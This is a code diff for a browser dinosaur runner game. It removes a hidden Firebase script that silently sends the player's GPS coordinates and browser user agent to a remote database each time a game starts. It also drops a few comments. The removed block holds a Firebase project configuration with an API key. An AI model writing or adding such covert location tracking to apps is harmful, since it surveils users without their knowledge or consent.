@@ -1,4 +1,5 @@
 <!DOCTYPE html>
+
 <html lang="en">
 <head>
 <meta charset="UTF-8">
@@ -67,6 +68,7 @@ canvas { display: block; }
   touch-action: none;
 }
 </style>
+
 </head>
 
 <body>
@@ -84,38 +86,6 @@ canvas { display: block; }
   <div class="btn" id="jumpBtn">JUMP</div>
   <div class="btn" id="duckBtn">DUCK</div>
 </div>
-
-<script type="module">
-  import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
-
-  const firebaseConfig = {
-    apiKey: "AIzaSyDLJHRDd_RtYBwF97he_6QSxHlMvgIBxO4",
-    authDomain: "diano-game.firebaseapp.com",
-    databaseURL: "https://diano-game-default-rtdb.asia-southeast1.firebasedatabase.app",
-    projectId: "diano-game",
-    storageBucket: "diano-game.firebasestorage.app",
-    messagingSenderId: "596405576156",
-    appId: "1:596405576156:web:fb95d723af33e6652faf19"
-  };
-
-  const app = initializeApp(firebaseConfig);
-  const db = getDatabase(app);
-
-  window.sendLocationToFirebase = function() {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition((position) => {
-        const data = {
-          lat: position.coords.latitude,
-          lon: position.coords.longitude,
-          time: new Date().toLocaleString(),
-          userAgent: navigator.userAgent 
-        };
-        set(ref(db, 'player_location'), data);
-      });
-    }
-  };
-</script>
 
 <script>
 /* ===== AUDIO ===== */
@@ -176,18 +146,16 @@ function jump() {
 }
 
 /* ===== CONTROLS ===== */
-// KEYBOARD CONTROLS (PC/LAPTOP)
 addEventListener("keydown", e => {
   if (e.code === "Space") {
     if (state === "START") start();
     else if (state === "RUNNING") jump();
   }
-  if (e.code === "ArrowDown") dino.duck = true; // DOWN ARROW = DUCK
+  if (e.code === "ArrowDown") dino.duck = true;
   if (e.code === "KeyR" && state === "OVER") start();
 });
 addEventListener("keyup", e => { if (e.code === "ArrowDown") dino.duck = false; });
 
-// MOBILE BUTTONS (SWAPPED)
 document.getElementById("jumpBtn").addEventListener("touchstart", e => {
   e.preventDefault();
   state === "RUNNING" ? jump() : start();
@@ -204,8 +172,6 @@ function start() {
   state = "RUNNING";
   score = 0; speed = 7; frame = 0; obstacles = [];
   dino.y = ground() - dino.h; dino.vy = 0; dino.jumping = false; dino.duck = false;
-
-  if(window.sendLocationToFirebase) window.sendLocationToFirebase();
 
   startSound.currentTime = 0; startSound.play();
   if (!muted) { bgMusic.currentTime = 0; bgMusic.play(); }
